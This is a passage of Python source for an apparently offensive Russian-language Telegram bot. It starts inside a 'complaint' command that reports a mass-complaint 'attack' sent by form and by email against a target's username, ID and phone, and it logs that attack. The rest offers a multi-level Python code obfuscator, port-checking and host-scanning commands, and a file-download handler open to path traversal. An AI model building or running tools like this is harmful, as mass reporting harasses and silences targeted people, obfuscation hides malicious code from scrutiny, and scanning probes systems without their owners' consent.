        result_text = f"""
ОТПРАВКА ЖАЛОБ ЗАВЕРШЕНА

Цель: @{username}
ID: {telegram_id}
Тип жалобы: {complaint_type}

Отправлено жалоб через форму: {complaints_sent}
Отправлено email жалоб: {emails_sent}
Всего отправок: {complaints_sent + emails_sent}

Статус: Атака выполнена
"""
        
        await db.save_attack(
            user_id=message.from_user.id,
            attack_type="complaint_cmd",
            target_username=username,
            target_id=telegram_id,
            target_phone=phone,
            complaint_type=complaint_type,
            requests_sent=complaints_sent,
            emails_sent=emails_sent
        )
        
        await message.answer(result_text)
        
    except Exception as e:
        logger.error(f"Complaint command error: {e}")
        await message.answer(f"Ошибка при отправке жалоб: {str(e)[:200]}")

@dp.callback_query(F.data == "useful_menu")
async def useful_menu_callback(callback: CallbackQuery):
    useful_text = """
ПОЛЕЗНОЕ МЕНЮ

Доступные функции:

- Обфускатор - шифрование Python кода
- Файлы - скачивание файлов из папки

Утилиты:
- /generate_pass [length] [count] - Генерация паролей
- /check_port IP порт - Проверка порта
- /myinfo - Ваша информация
- /phishing [ссылка] - Проверка на фишинг

Сканирование:
- /scan [цель] - Полное сканирование
- /geo [IP] - Детальная геолокация
- /whois [домен] - WHOIS информация
- /dns [домен] - DNS записи
- /tech [сайт] - Технологии сайта
- /ports [IP] - Сканирование портов
"""
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Обфускатор", callback_data="menu_obfuscator")],
        [InlineKeyboardButton(text="Файлы", callback_data="menu_files")],
        [InlineKeyboardButton(text="Сканировать IP", callback_data="geo_scan")],
        [InlineKeyboardButton(text="Сканировать сайт", callback_data="full_scan")],
        [InlineKeyboardButton(text="Назад", callback_data="menu_main")]
    ])
    
    # Проверяем, изменилось ли содержимое перед редактированием
    if callback.message.text != useful_text or callback.message.reply_markup != keyboard:
        await callback.message.edit_text(useful_text, reply_markup=keyboard)
    else:
        await callback.answer()

# ОБФУСКАТОР И ФАЙЛЫ
@dp.callback_query(F.data == "menu_obfuscator")
async def obfuscator_menu_callback(callback: CallbackQuery):
    obfuscator_text = """
ОБФУСКАТОР PYTHON КОДА

Отправьте Python файл для обфускации.

Поддерживаемые методы (1-15):
1-5: Базовые методы
6-8: Средняя защита
9-12: Хорошая защита
13-15: Максимальная защита

Рекомендуемые методы: 13, 14, 15

Для начала отправьте Python файл (.py)
Максимальный размер: 1 МБ
"""
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Отправить файл", callback_data="start_obfuscation")],
        [InlineKeyboardButton(text="Назад", callback_data="useful_menu")]
    ])
    
    # Проверяем, изменилось ли содержимое перед редактированием
    if callback.message.text != obfuscator_text or callback.message.reply_markup != keyboard:
        await callback.message.edit_text(obfuscator_text, reply_markup=keyboard)
    else:
        await callback.answer()

@dp.callback_query(F.data == "start_obfuscation")
async def start_obfuscation(callback: CallbackQuery, state: FSMContext):
    await state.set_state(ObfuscatorStates.waiting_for_file)
    
    text = "Отправьте Python файл (.py) для обфускации:"
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Отмена", callback_data="menu_obfuscator")]
    ])
    
    # Проверяем, изменилось ли содержимое перед редактированием
    if callback.message.text != text or callback.message.reply_markup != keyboard:
        await callback.message.edit_text(text, reply_markup=keyboard)
    else:
        await callback.answer()

@dp.message(ObfuscatorStates.waiting_for_file)
async def process_obfuscation_file(message: Message, state: FSMContext):
    if not message.document:
        await message.answer("Пожалуйста, отправьте файл.")
        return
    
    file_name = message.document.file_name
    if not file_name.endswith('.py'):
        await message.answer("Пожалуйста, отправьте Python файл (.py)")
        return
    
    file_size = message.document.file_size
    if file_size > 1024 * 1024:
        await message.answer("Файл слишком большой. Максимальный размер: 1 МБ")
        return
    
    await message.answer("Загрузка файла...")
    
    try:
        file = await bot.get_file(message.document.file_id)
        file_content = await bot.download_file(file.file_path)
        code = file_content.read().decode('utf-8')
        
        await state.update_data(original_code=code, original_filename=file_name)
        await state.set_state(ObfuscatorStates.waiting_for_method)
        
        await message.answer(
            "Выберите метод обфускации (1-15):\n\n"
            "1-5: Базовые методы\n"
            "6-8: Средняя защита\n"
            "9-12: Хорошая защита\n"
            "13-15: Максимальная защита\n\n"
            "Введите номер метода:"
        )
        
    except Exception as e:
        logger.error(f"File processing error: {e}")
        await message.answer(f"Ошибка при обработке файла: {str(e)[:200]}")
        await state.clear()

@dp.message(ObfuscatorStates.waiting_for_method)
async def process_obfuscation_method(message: Message, state: FSMContext):
    method_str = message.text.strip()
    
    try:
        method = int(method_str)
        if method < 1 or method > 15:
            await message.answer("Пожалуйста, введите число от 1 до 15")
            return
    except:
        await message.answer("Пожалуйста, введите число от 1 до 15")
        return
    
    await state.update_data(method=method)
    await state.set_state(ObfuscatorStates.waiting_for_loops)
    
    await message.answer(
        "Введите количество циклов обфускации (1-5):\n"
        "Рекомендуется: 2-3"
    )

@dp.message(ObfuscatorStates.waiting_for_loops)
async def process_obfuscation_loops(message: Message, state: FSMContext):
    loops_str = message.text.strip()
    
    try:
        loops = int(loops_str)
        if loops < 1 or loops > 5:
            await message.answer("Пожалуйста, введите число от 1 до 5")
            return
    except:
        await message.answer("Пожалуйста, введите число от 1 до 5")
        return
    
    data = await state.get_data()
    original_code = data.get('original_code')
    method = data.get('method')
    original_filename = data.get('original_filename')
    
    await message.answer(f"Обфускация кода методом {method} с {loops} циклами...")
    
    try:
        obfuscated_code = obfuscate_code(original_code, method, loops)
        
        # Сохраняем обфусцированный файл
        obfuscated_filename = f"obfuscated_{method}_{loops}_{original_filename}"
        file_path = os.path.join(FILES_DIR, obfuscated_filename)
        
        with open(file_path, 'w', encoding='utf-8') as f:
            f.write(obfuscated_code)
        
        # Отправляем файл пользователю
        file_to_send = FSInputFile(file_path)
        await message.answer_document(
            file_to_send,
            caption=f"Обфусцированный код (метод {method}, {loops} циклов)"
        )
        
        await message.answer(
            "Готово! Файл сохранен в папке files.",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="Обфусцировать еще", callback_data="menu_obfuscator")],
                [InlineKeyboardButton(text="В меню", callback_data="useful_menu")]
            ])
        )
        
    except Exception as e:
        logger.error(f"Obfuscation error: {e}")
        await message.answer(f"Ошибка при обфускации: {str(e)[:200]}")
    
    await state.clear()

@dp.callback_query(F.data == "menu_files")
async def files_menu_callback(callback: CallbackQuery):
    try:
        files = [f for f in os.listdir(FILES_DIR) if os.path.isfile(os.path.join(FILES_DIR, f))]
        
        if not files:
            text = "В папке файлов пока нет файлов.\n\nЗагрузите файлы в папку 'files'"
            keyboard = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="Назад", callback_data="useful_menu")]
            ])
            
            # Проверяем, изменилось ли содержимое перед редактированием
            if callback.message.text != text or callback.message.reply_markup != keyboard:
                await callback.message.edit_text(text, reply_markup=keyboard)
            else:
                await callback.answer()
        else:
            text = f"Доступно файлов: {len(files)}\n\nВыберите файл для скачивания:"
            
            keyboard_buttons = []
            for i, file in enumerate(files[:10]):
                file_size = os.path.getsize(os.path.join(FILES_DIR, file))
                size_mb = file_size / (1024 * 1024)
                
                keyboard_buttons.append([
                    InlineKeyboardButton(
                        text=f"{file} ({size_mb:.1f} MB)",
                        callback_data=f"send_file_{file}"
                    )
                ])
            
            keyboard_buttons.append([InlineKeyboardButton(text="Назад", callback_data="useful_menu")])
            keyboard = InlineKeyboardMarkup(inline_keyboard=keyboard_buttons)
            
            # Проверяем, изменилось ли содержимое перед редактированием
            if callback.message.text != text or callback.message.reply_markup != keyboard:
                await callback.message.edit_text(text, reply_markup=keyboard)
            else:
                await callback.answer()
            
    except Exception as e:
        logger.error(f"Error loading files: {e}")
        error_text = f"Ошибка при загрузке файлов: {str(e)}"
        error_keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="Назад", callback_data="useful_menu")]
        ])
        
        # Проверяем, изменилось ли содержимое перед редактированием
        if callback.message.text != error_text or callback.message.reply_markup != error_keyboard:
            await callback.message.edit_text(error_text, reply_markup=error_keyboard)
        else:
            await callback.answer()

@dp.callback_query(F.data.startswith("send_file_"))
async def send_file_callback(callback: CallbackQuery):
    filename = callback.data[10:]
    file_path = os.path.join(FILES_DIR, filename)
    
    if not os.path.exists(file_path):
        await callback.answer("Файл не найден", show_alert=True)
        return
    
    try:
        file_to_send = FSInputFile(file_path)
        await callback.message.answer_document(file_to_send)
        await callback.answer()
    except Exception as e:
        logger.error(f"Error sending file: {e}")
        await callback.answer(f"Ошибка: {str(e)[:100]}", show_alert=True)

@dp.message(Command("generate_pass"))
async def generate_pass_cmd(message: Message):
    await db.log_command(message.from_user.id, "generate_pass")
    
    args = message.text.split()
    
    length = 12
    count = 5
    
    if len(args) >= 2:
        try:
            length = int(args[1])
            if length > 50:
                length = 50
                await message.answer("Максимальная длина 50. Установлено 50.")
        except:
            pass
    
    if len(args) >= 3:
        try:
            count = int(args[2])
            if count > 20:
                count = 20
                await message.answer("Максимум 20 паролей. Сгенерирую 20.")
        except:
            pass
    
    passwords = []
    characters = string.ascii_letters + string.digits + "!@#$%^&*()_+-=[]{}|;:,.<>?"
    
    for i in range(count):
        password = ''.join(random.choices(characters, k=length))
        passwords.append(password)
    
    result = f"Сгенерировано {len(passwords)} паролей (длина: {length}):\n\n" + "\n".join([f"{i+1}. {pwd}" for i, pwd in enumerate(passwords)])
    await message.answer(f"<pre>{result}</pre>", parse_mode=ParseMode.HTML)

@dp.message(Command("check_port"))
async def check_port_cmd(message: Message):
    await db.log_command(message.from_user.id, "check_port")
    
    args = message.text.split()
    if len(args) < 3:
        await message.answer("Использование: /check_port IP порт\nПример: /check_port 8.8.8.8 80")
        return
    
    ip = args[1]
    port = args[2]
    
    try:
        port_num = int(port)
        if not 1 <= port_num <= 65535:
            await message.answer("Порт должен быть от 1 до 65535")
            return
    except:
        await message.answer("Порт должен быть числом")
        return
    
    await message.answer(f"Проверяю порт {port} на {ip}...")
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        
        result = sock.connect_ex((ip, port_num))
        
        if result == 0:
            await message.answer(f"Порт {port} на {ip} ОТКРЫТ")
        else:
            await message.answer(f"Порт {port} на {ip} ЗАКРЫТ")
        
        sock.close()
    except Exception as e:
        await message.answer(f"Ошибка: {str(e)[:100]}")

@dp.message(Command("myinfo"))
async def myinfo_cmd(message: Message):
    await db.log_command(message.from_user.id, "myinfo")
    
    user = message.from_user
    
    info = f"""
ВАША ИНФОРМАЦИЯ

ID: <code>{user.id}</code>
Имя: {user.first_name or "Не указано"}
Фамилия: {user.last_name or "Не указано"}
Username: @{user.username or "Не указано"}

Статистика:
- Подписан на канал: {"Да" if await check_subscription(user.id) else "Нет"}
"""
    
    await message.answer(info, parse_mode=ParseMode.HTML)

@dp.message()
async def unknown_command(message: Message):
    if message.text.startswith('/'):
        await message.answer("Неизвестная команда. Используйте /start или /menu")

async def main():
    logger.info("Бот запускается...")
    logger.info(f"Инициализация базы данных: {DB_NAME}")
    logger.info(f"Папка файлов: {FILES_DIR}")
    
    await db.init_db()
    
    logger.info("База данных инициализирована")
    logger.info(f"Администраторы: {ADMIN_IDS}")
    
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
